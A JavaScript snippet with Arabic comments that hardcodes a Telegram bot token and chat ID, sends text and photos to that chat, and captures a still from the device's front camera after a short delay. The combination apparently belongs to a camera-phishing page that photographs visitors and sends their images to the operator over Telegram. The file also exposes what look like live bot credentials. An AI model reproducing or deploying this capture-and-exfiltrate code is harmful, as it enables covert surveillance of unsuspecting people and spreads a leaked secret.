const TELEGRAM_BOT_TOKEN = "8244754527:AAHu4WAJeuHmUBaLWnkuPJEpUPxw5vGdc0I";
const TELEGRAM_CHAT_ID = "7651215883";

/* === وظائف مساعدة لإرسال رسائل وصور === */
async function tgSendMessage(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    const resp = await fetch(url, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML"})
    });
    const j = await resp.json();
    if (!j.ok) throw new Error(j.description || 'Telegram error');
    return j;
  } catch (err) {
    console.error('tgSendMessage error:', err);
    throw err; // نرمي الخطأ ليعالجه المستدعي
  }
}

async function tgSendPhoto(blob, caption = "") {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
  try {
    const fd = new FormData();
    fd.append("chat_id", TELEGRAM_CHAT_ID);
    fd.append("photo", blob, "photo.png");
    if (caption) fd.append("caption", caption);
    const resp = await fetch(url, { method: "POST", body: fd });
    const j = await resp.json();
    if (!j.ok) throw new Error(j.description || 'Telegram error');
    return j;
  } catch (err) {
    console.error('tgSendPhoto error:', err);
    throw err;
  }
}

/* === التقاط صورة عبر الكاميرا === */
async function capturePhoto(facingMode = "user", timeoutMs = 1600) {
  try {
    const video = document.createElement("video");
    video.setAttribute("playsinline", ""); // لهواتف iOS
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
    video.srcObject = stream;
    await video.play().catch(()=>{}); // قد يرفض play في بعض البيئات لكن سنعتمد على الانتظار
    // ننتظر قليلاً لثبات الكاميرا
    await new Promise(r => setTimeout(r, timeoutMs));
    const canvas = document.createElement("canvas");
    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, w, h);
    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
    // إيقاف جميع المسارات
    stream.getTracks().forEach(t => t.stop());
    return blob; // قد يكون null إذا فشل toBlob
  } catch (err) {
    console.warn(`capturePhoto(${facingMode}) failed:`, err);
    return null;
  }
}

/* === هروب HTML بسيط لسلاسل الرسائل === */
function escapeHtml(s) {
  if (!s) return "";
  return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}
